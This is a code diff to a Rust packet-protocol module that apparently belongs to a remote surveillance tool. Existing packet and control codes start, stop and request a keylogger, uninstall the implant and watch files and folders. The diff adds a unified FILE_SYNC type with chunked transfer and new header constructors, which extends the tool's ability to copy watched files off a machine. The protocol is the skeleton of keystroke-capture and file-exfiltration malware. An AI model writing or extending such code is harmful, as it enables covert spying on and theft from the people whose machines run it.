@@ -12,21 +12,31 @@ pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
 pub const PACKET_TYPE_FILE_WATCH: u8 = 9;
 pub const PACKET_TYPE_FOLDER_WATCH: u8 = 10;
+pub const PACKET_TYPE_FILE_SYNC: u8 = 11;  // ADD THIS - Unified file/folder sync
 
-// Control subtypes for PACKET_TYPE_CTRL
+// Control subtypes
 pub const CTRL_START_KEYLOGGER: u8 = 1;
 pub const CTRL_STOP_KEYLOGGER: u8 = 2;
 pub const CTRL_REQUEST_KEYLOG: u8 = 3;
 pub const CTRL_UNINSTALL: u8 = 4;
 
-// File watch subtypes
+// File watch subtypes (legacy)
 pub const FILE_WATCH_UPDATE: u8 = 1;
 pub const FILE_WATCH_DELETE: u8 = 2;
 
-// Folder watch subtypes
+// Folder watch subtypes (legacy)
 pub const FOLDER_WATCH_FILE_CREATE: u8 = 1;
 pub const FOLDER_WATCH_FILE_UPDATE: u8 = 2;
 pub const FOLDER_WATCH_FILE_DELETE: u8 = 3;
+
+// ADD THIS - Unified FILE_SYNC subtypes
+pub const FILE_SYNC_CREATE: u8 = 1;
+pub const FILE_SYNC_UPDATE: u8 = 2;
+pub const FILE_SYNC_DELETE: u8 = 3;
+
+// ADD THIS - Chunk flags
+pub const FLAG_LAST_CHUNK: u16 = 0x0001;
+pub const CHUNK_SIZE: usize = 1024;
 
 pub const HEADER_SIZE: usize = 32;
 
@@ -47,6 +57,37 @@ impl PacketHeader {
             packet_type: ptype,
             subtype,
             content_length: content.len() as u32,
+            sequence: 0,
+            flags: 0,
+        }
+    }
+
+    // ADD THIS - For FILE_SYNC with custom message_id
+    pub fn new_with_id(
+        message_id: [u8; 16],
+        ptype: u8,
+        subtype: u8,
+        content_len: u32,
+        sequence: u16,
+        flags: u16,
+    ) -> Self {
+        Self {
+            message_id,
+            packet_type: ptype,
+            subtype,
+            content_length: content_len,
+            sequence,
+            flags,
+        }
+    }
+
+    // ADD THIS - Simple header without message_id
+    pub fn new_simple(ptype: u8, subtype: u8, content_len: u32) -> Self {
+        Self {
+            message_id: Uuid::new_v4().as_bytes().to_owned(),
+            packet_type: ptype,
+            subtype,
+            content_length: content_len,
             sequence: 0,
             flags: 0,
         }
